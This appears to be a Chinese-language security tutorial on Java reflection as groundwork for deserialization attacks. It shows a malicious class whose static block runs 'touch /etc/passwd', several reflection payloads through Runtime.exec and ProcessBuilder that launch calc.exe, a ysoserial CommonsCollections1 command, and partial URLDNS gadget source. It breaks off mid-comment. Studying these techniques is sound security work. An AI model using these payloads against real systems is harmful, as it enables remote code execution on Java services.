    class TrainPrint{
        {
            System.out.printf("Empty block inittial &s\\n", this.getClass());
        }
        static{
            System.out.printf("Static initial %s\\n", TrainPrint.class);
        }
        public TrainPrint(){
            System.out.printf("Innitial %s\\n", this.getClass());
        }
    }
这个类中一共有三个代码块 ，在进行初始化时按照以下优先级调用代码块
  1. static{}
  2. {}
  3. 构造函数
其中，static{}就是在“类初始化”时调用的，而{}中的代码会放在构造函数的`super()`后面，但在当前构造函数内容的前面
所以`forNmae`中的`initialize=true`其实就是告诉jvm是否执行“类初始化”
那么 如果有以下方法 其中的参数name可控：
    public void ref(String name) throws Exception {
            Class.forName(name);
    }
我们就可以编写一个恶意类，将恶意代码放置在`static{}`中，从而执行：
    class PayLoad{
        static{
            try{
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/etc/passwd"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e){
            }
        }
    }
## **如何通过反射执行命令**
我们刚才提到，如果想拿到一个类，需要先import才能使用，而使用forname就不需要了，这样我们就可以利用forname加载任意类。
在java中是支持内部类的，比如我们在普通类
c1中编写内部类c2，在编译时会生成两个文件：c1.class和c1$c2.class，这两个类之间可以看作没有关联，通过`Class.forname("c1$c2")`即可加载这个内部类，当fastjson在`checkAutotype`时就会先讲$替换成`.`
上面说到的`$`的作用时查找内部类。
当我们通过反射获取到一个类之后，可以继续通过反射来调用其中的属性和方法，也可以继续实例化这个类，调用其中的方法，也就是用`newInstance()`
上面提到过newInstance会实例化类，并且触发它的构造方法，所以在一些情况下newInstance是不能成功执行的，比如
    Class clazz = Class.forName("java.lang.Runtime");
    clazz.getMethod("exec",String.class).invoke(clazz.newInstance(), "id");
我们分析上面两行代码，首先通过反射将`java.lang.Runtime`中的所有属性和方法存到了clazz中，继续利用反射拿到clazz（Runtime）中的`exec`方法，最后使用invoke执行该方法，问题就出在乐invoke的参数上。
我们上面提到了invoke执行方法，第一个参数是该方法所在的对象或者类，也就是说我们需要通过`clazz.newInstance`来实例化clazz，作为invoke的参数，但clazz的构造函数来自于Runtime，我们看一下Runtime的构造函数
Runtime的构造方法为私有，所以在newInstance时才会报错。
这里P神的 **java安全漫谈** 里说明了为什么要将构造方法设为私有，这就是很常见的“单例模式”。
比如对于web应用来说，数据库只需要建立一次链接，而不是每次用到数据库都要建立一次新的连接，作为开发者就可以将数据库连接使用的构造函数设为私有，然后编写一个静态方法来获取：
    public class TrainDB() {
        private static TrainDB instance = new TrainDB();
        public static TrainDB getInstance() {
            return instance;
        }
        private TrainDB() {
        // 建立连接的代码
        }
    }
在这个类初始化时，就会在类内部实例化出一个连接数据库的对象，我们在需要数据库连接时，只需要调用其中的`getInstance()`方法获取这个对象即可。
回到如何执行命令上，如果不能通过实例化调用方法，我们就可以尝试继续通过反射来调用方法，我们将代码改成下面这样就可以了：
    Class clazz = Class.forname("java.lang.Runtime");
    clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),"calc.exe");
我们在刚开始执行命令时就用到了Runtime来获取其中的`exec`方法，不难看出它和python的os类似，给我们提供了一些可以执行命令的方法，那么Runtime到底有什么作用？  
每当我们执行一个java程序时，Runtime类都会生成一个实例，来储存当前运行的java程序的相关信息，我们可以通过Runtime类中的`getRuntime()`方法来调用当前java程序的运行环境（也就是上面提到的储存相关信息的实例），这样就可以在执行系统命令时让jvm知道我们要对哪个java程序执行命令
我们分析以下上面执行命令的两行代码
  * 通过反射获得Runtime类
  * 通过反射获得clazz(Runtime)中的`exec`方法
  * `invoke()`调用exec方法
  * 调用`getRuntime()`将当前java程序运行的环境作为参数传递给invoke，并执行命令`exec "calc.exe"`
可以发现我们在用invoke执行Runtime中的命令时，如果不能通过`newInstance`来实例化对象作为参数，我们可以通过调用`getRuntime()`来获取当前环境，从而代替invoke的第一个参数。
上面执行命令的两行代码分解开就是：
    Class clazz = Class.forname("java.lang.Runtime");
    Method execMethod = clazz.getMethod("exec", String.class);
    Method getRuntime = clazz.getMethod("getRuntime")；
    Object currentRuntime = getRuntime.invoke(clazz);
    execMethod.invoke(currentRuntime, "calc.exe");
## **一些其他的反射机制**
  * 我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？
  * 如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？
### **利用`ProcessBuilder`执行命令**
第一个问题，我们可以用一个新的反射方法`getConstructor`。
和getMethod类似，`getConstructor`接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数
比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用`start()`来执行命令
**ProcessBuilder:**
ProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程
，我们可以理解成当`getRuntime`被禁用时，可以用`ProcessBuilder`来执行命令。
`ProcessBuilder`有两个构造函数：
  * `public ProcessBuilder(List command)`
  * `public ProcessBuilder(String... commang)`
我们用`ProcessBuilder`写一个执行命令的payload：
    Class clazz = Class.forName("java.lang.ProcessBuilder");
     ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
  1. 首先利用反射获取`ProcessBuilder`类；
  2. 获取clazz(ProcessBuilder)形参列表为`List command`的构造函数；
  3. 将获取到的构造函数利用newInstance进行实例化，调用构造函数；
  4. 对构造函数传入的参数为 `calc.exe`，并且用`Arrays.asList`方法将要执行的命令转为List类型；
  5. 返回List类型的`command`；
    1. 将List类型的command强制转换为`ProcessBuilder`类型，这样就可以调用`ProcessBuilder`中的start方法打开`calc.exe`进程。
    可以看到这个方法需要用到强转，但有时候在利用漏洞时并没有这种语法，所以我们接着利用反射来完成这一步
    ```
    Class clazz = Class.forName("java.lang.ProcessBuilder"); clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
    ```
    1. forName获取类；
    2. 获取clazz中的`start`方法；
    3. 用invoke执行start方法，这里我们之前说过用invoke执行方法时，第一个参数要是该方法所在类的对象，但clazz中没有无参构造方法，所以invoke的第一个参数不能是`clazz.newInstance`，所以这里我们换个方法，通过`getConstructor`获取到`ProcessBuilder`的构造函数，并利用这个构造函数`newInstance`，在实例化的同时对构造方法传入参数`calc.exe`，因为我们刚才提到了`ProcessBuilder`是没有无参构造函数的，所以在实例化的时候必须要传入参数。（这里获取的构造方法依然是上面提到的形参列表为List的构造函数）
    那么我们再来看`ProcessBuilder`的另一个构造方法：
    我们看到这个构造方法的参数列表为`String... command`，这个参数列表的意思其实就是参数数量可变列表，当我们在写一个方法时，不知道要传入多少参数，我们就可以写成`Type... Args`的方式，其实在底层来看`String... command`这样的写法就等效于`String[] command`，相当于传入了一个字符数组
    比如有一个hello方法：
    ```
    public void hello(String...names){}
    ```
    如果我们有一个数组想传给y1方法，只需要直接传就行：
    ```
    String[] names = {"hello", "world"};
    hello(names)
    ```
    所以如果我们想要获取到参数列表为`String... command` 的这个构造方法，我们在`getConstructor`时要传入的参数为`String[].class`，在调用newInstance时，因为这个构造方法本身接受的就是一个可变长数组，我们在传入时也传入了一个数组，因此叠加起来是一个二维数组，所以利用这个构造方法的payload如下：
    ```
    Class clazz = Class.forName("java.lang.ProcessBuilder");
    ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{"calc.exe"}})).start();
    ```
    1. 反射拿到类；
    2. `getConstructor`拿到参数列表为`String... command`的构造方法；
    3. `newInstance`触发该构造方法，并且传入一个二维字符数组；
    4. 由于返回的command是字符数组类型，所以强转为`ProcessBuilder`并用`start()`方法触发；
### 如何通过反射执行私有方法
再回到第二个问题上，如果一个方法或构造方法是private，我们是否能执行它呢？
这里就要用到`getDeclared`系列的反射了，与普通的`getMethod，getConstructor`区别是：
  * `getMethod`系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；
  * `getDeclaredMethod`系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了
在用法上`getDeclaredMethod`的具体用法与`getMethod`类似，`getDeclaredConstructor`的具体用法和`getConstructor`类似
举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过`Runtime.getRuntime()`来获取对象，其实我们也可以直接用`getDeclaredConstructor`来获取这个私有的构造方法实例化对象，进而执行命令：
    Class clazz = Class.forName("java.lang.Runtime");
            Constructor m =clazz.getDeclaredConstructor();
            m.setAccessible(true);
            clazz.getMethod("exec",String.class).invoke(m.newInstance(), "calc.exe");
这里我们在获取到私有方法后，要用`setAccessible()`方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用`setAccessible()`方法修改作用域这个方法是仍然不能调用的
————————————————————————————————————————————
## **ysoserial**
在上手java反序列化的第一条链子之前，我们需要一个集成了java反序列化各种gadget
chains（利用链）的工具，[ysoserial](https://github.com/frohoff/ysoserial)。
ysoserial下载好后还需要再安装一些其他的依赖，教程网上有很多，我就不细说了，我们先简单了解一下ysoserial中一些比较重要的东西。
首先是序列化（Serialize）：
这个序列化操作和我之前提到的基本是一样的，将一个对象以字节流的形式输出并保存，并触发它的writeObject。
反序列化（Unserialize 再ysoserial中叫Deserialize）：
将一个字节流读入还原为对象并触发它的readObject。
Payloadrunner：
可以看到在Payloadrunner中，先将对象序列化再反序列化，其实就是用来运行我们的链，并生成相应的payload，具体执行命令（用cc链举例）：
    java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 "id"
如果我们直接再intellij中运行这些链，不会出现payload，并且要注意一个问题，在java反序列化中几乎我们反序列化执行命令的结果是没有回显的，所以我们需要用一些比较明显的命令让我们知道这个链子被成功触发了，在ysoserial中我们一般用计算器`calc.exe`，一般来说ysoserial安装好后payload默认的参数是`calc.exe`，如果不是的话就要自己手动设置默认参数了，具体的我就不多说了。
## **URLDNS**
那么我们来上手java反序列化的第一条链子，`URLDNS`，这条链子的利用链很短，我们看一下ysoserial中的代码：
    public class URLDNS implements ObjectPayload {
            public Object getObject(final String url) throws Exception {
                    //Avoid DNS resolution during payload creation
                    //Since the field java.net.URL.handler is transient, it will not be part of the serialized payload.
                    URLStreamHandler handler = new SilentURLStreamHandler();
                    HashMap ht = new HashMap(); // HashMap that will contain the URL
                    URL u = new URL(null, url, handler); // URL to use as the Key
                    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
                    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
                    return ht;
            }
            public static void main(final String[] args) throws Exception {
                    PayloadRunner.run(URLDNS.class, args);
            }
            /**
             * This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.